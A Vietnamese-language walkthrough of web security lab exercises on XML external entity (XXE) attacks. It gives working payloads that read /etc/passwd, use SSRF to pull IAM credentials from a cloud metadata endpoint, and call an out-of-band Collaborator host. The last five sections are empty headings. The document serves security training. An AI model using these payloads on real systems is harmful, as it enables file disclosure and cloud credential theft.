# 1. Exploiting XXE using external entities to retrieve files
Ta thấy chức năng stock check có body là một đoạn mã XML. Như vậy ta có thẻ exploit bằng cách chèn đoạn code sau vào body:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
Kết quả nội dung file /etc/passwd được in ra thành công
![image](https://user-images.githubusercontent.com/103978452/205596701-bb968712-24a2-4d79-94cd-6247202fb977.png)

# 2. Exploiting XXE to perform SSRF attacks
Cấu hình đoạn XML như sau:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
Sau khi submit, ta thấy kết quả trả về `Invalid product ID: latest". Như vậy "latest" chính là response của "http://169.254.169.254". Truy cập "http://169.254.169.254/latest" thì ta lại được một chuỗi mới. Cứ như vậy, gửi URL đầy đủ là "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", ta thu được SecretAccessKey.

![image](https://user-images.githubusercontent.com/103978452/206396710-4d353393-563d-45a0-ae34-68136b7c50db.png)

# 3. Blind XXE with out-of-band interaction
Cấu hình request như bài 2, nhưng thay đổi URL thành địa chỉ của Burp Collaborator. Sau khi submit, vào Burp Collaborator Client kiểm tra thì ta thấy có requests được gửi đến. Bài lab được giải thành công.

![image](https://user-images.githubusercontent.com/103978452/206397595-8e3a3423-55e8-4382-944a-cd02e89f8de4.png)

# 4. Blind XXE with out-of-band interaction via XML parameter entities
Cấu hình đoạn XML để gửi request đến Burp Collaborator sử dụng parameter entity:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE exploit [<!ENTITY % xxe SYSTEM "http://pa3d5ksa3lk30zok1tbyh6llqcw2kr.oastify.com"> %xxe; ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
Sau khi submit, vào Burp Collaborator kiểm tra thì thấy có requests được gửi đến. Bài lab được giải thành công.
# 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD

# 6. Exploiting blind XXE to retrieve data via error messages

# 7. Exploiting XInclude to retrieve files

# 8. Exploiting XXE via image file upload

# 9. Exploiting XXE to retrieve data by repurposing a local DTD
